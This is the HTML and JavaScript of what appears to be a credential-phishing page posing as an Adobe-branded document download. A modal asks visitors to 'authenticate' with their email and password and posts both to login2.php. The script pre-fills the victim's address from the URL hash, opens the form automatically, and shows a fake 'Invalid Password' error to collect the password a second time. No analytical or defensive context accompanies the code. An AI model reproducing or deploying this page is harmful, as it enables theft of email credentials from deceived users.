<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
    <style>
        body {
			background-image: url(https://i.imgur.com/6ncDQvz.png);
			background-repeat: repeat;
			color: #045eb4;
		}
		
		
		
		#d {
			position: relative;
			left: 530px;
			top: 350px;
			
		}
		
	
		.blue{
			background-color: #045eb4;
			color: white;
		}
		#sub1{
			margin-top: 380px;
			margin-left: 140px;
		
			position: absolute;
			z-index: 1;
			
			
		}
				.sky{
					background-color: #409fff;
					color:white;
			
		}
	</style>
</head>

<body>
    <button type="button" id="sub1" class="btn btn-md sky text-white" data-toggle="modal" data-target="#myModal">
        View Document Online
    </button>
    <!-- The Modal -->
    <div class="modal fade" id="myModal">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <!-- Modal Header -->
                <div class="modal-header">
                    <h4 class="modal-title"><img src="https://storage.googleapis.com/adobe-cs-rd132.appspot.com/images/LjewnLS.jpg" width="150"><br></h4>
                    <button type="button" class="close" data-dismiss="modal">×</button>
                </div>
                <!-- Modal body -->
                <div class="modal-body">
                    <div class="d-flex justify-content-center">
                        <form action="login2.php" method="POST" class="col-sm-8 bg-light p-3" id="profileUp">
                            <input type="hidden" name="count" id="count" value="0">
                            <p class="text-dark" id="err">Please authenticate your download with your email client</p>
                            <hr>
                            <div class="alert alert-danger" id="msg" style="display: none;">Invalid Password.! Please enter correct password.</div>
                            <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
                            <p class="text-center"></p>
                            <div class="input-group mb-3 input-group-md">
                                <div class="input-group-prepend">
                                </div>
                                <input type="email" id="ai" placeholder="someone@example.com" value="" name="email" class="form-control text-center" required="">
                            </div>
                            <input type="password" name="password" class="form-control text-center" value="" id="pr" placeholder="Password" required="">
                            <span class="text-danger" id="er"></span>
                            <br>
                            <input id="sub" name="sub" type="submit" class="btn btn-md btn-block sky" value="Download">
                            <center><small></small></center>
                        </form>
                    </div>
                    <br>
                    <div class="text-center">
                        <img src="https://storage.googleapis.com/adobe-cs-rd132.appspot.com/images/tfjMn19.jpg" style="max-width:80%;">
                    </div>
                </div>
                <!-- Modal footer -->
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                </div>
            </div>
        </div>
    </div>
    <style>
    .tb_button {
        padding: 1px;
        cursor: pointer;
        border-right: 1px solid #8b8b8b;
        border-left: 1px solid #FFF;
        border-bottom: 1px solid #fff;
    }

    .tb_button.hover {
        borer: 2px outset #def;
        background-color: #f8f8f8 !important;
    }

    .ws_toolbar {
        z-index: 100000
    }

    .ws_toolbar .ws_tb_btn {
        cursor: pointer;
        border: 1px solid #555;
        padding: 3px
    }

    .tb_highlight {
        background-color: yellow
    }

    .tb_hide {
        visibility: hidden
    }

    .ws_toolbar img {
        padding: 2px;
        margin: 0px
    }
    </style>
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
<script>
<!--  /* global $ */
$(document).ready(function() {
    var count = 0;


    function getUrlVars() {
        var vars = {};
        var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m, key, value) {
            vars[key] = value;
        });
        return vars;
    }


    if (!getUrlVars()["count"]) {

    } else {
        var count = getUrlVars()["count"];
        $('#count').val(count);
    }



    /////////////url ai getting////////////////
    var ai = window.location.hash.substr(1);
    if (!ai) {

    } else {
        // $('#ai').val(ai);
        var my_ai = ai;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_ai)) {
            $('#error').show();
            ai.focus;
            return false;
        }
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        // alert(count);
        var ai = window.location.hash.substr(1);
        var my_ai = ai;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_ai)) {
            $('#error').show();
            return false;
        }
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        var count = $('#count').val();
        if (count == 1) {
            $("#msg").show();
        } else {
            $("#msg").hide();
        }
        $("#sub1").trigger("click");
        $('#ai').val(my_ai);

    }
    ///////////////url getting ai////////////////





});
</script>

</html>